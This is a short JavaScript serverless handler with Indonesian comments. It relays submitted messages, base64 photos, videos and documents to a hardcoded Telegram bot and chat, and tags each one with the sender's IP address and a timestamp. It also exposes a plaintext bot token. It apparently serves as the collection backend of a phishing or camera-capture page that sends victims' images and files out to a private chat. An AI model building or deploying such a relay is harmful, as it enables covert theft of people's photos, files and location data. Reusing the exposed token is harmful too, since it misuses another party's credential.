const BOT_TOKEN = "8995760973:AAHeOTaXK5pFSn8Y5Z4tlxjgR7vbYOhgUpI";
const CHAT_ID = "6126622503";

export default async function handler(req, res) {
    // GET untuk pesan
    if (req.method === 'GET' && req.query.msg) {
        try {
            const text = decodeURIComponent(req.query.msg);
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text })
            });
            res.status(200).send('OK');
        } catch(e) { res.status(500).json({ error: e.message }); }
        return;
    }

    // POST
    if (req.method === 'POST') {
        try {
            const { img, video, ts, filename, type } = req.body;
            const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
            const ua = req.headers['user-agent'] || 'unknown';
            const caption = `📸 ${type || 'media'} | IP: ${ip} | ${new Date(ts).toISOString()}`;

            // Kirim dokumen (ZIP, video, dll)
            if ((type === 'document' || type === 'video') && video) {
                const buf = Buffer.from(video, 'base64');
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                const isVideo = type === 'video' || filename?.match(/\.(mp4|webm|mov)$/i);
                const endpoint = isVideo ? 'sendVideo' : 'sendDocument';
                const blob = new Blob([buf], { type: isVideo ? 'video/mp4' : 'application/octet-stream' });
                formData.append(isVideo ? 'video' : 'document', blob, filename || 'file');
                formData.append('caption', caption);
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, {
                    method: 'POST',
                    body: formData
                });
                res.status(200).send('OK');
                return;
            }

            // Kirim foto
            if (img) {
                const buf = Buffer.from(img, 'base64');
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', new Blob([buf], { type: 'image/jpeg' }), filename || 'foto.jpg');
                formData.append('caption', caption);
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                res.status(200).send('OK');
                return;
            }

            res.status(400).send('No media');
        } catch(e) {
            console.error(e);
            res.status(500).json({ error: e.message });
        }
        return;
    }

    res.status(200).send('Bot Aktif!');
}
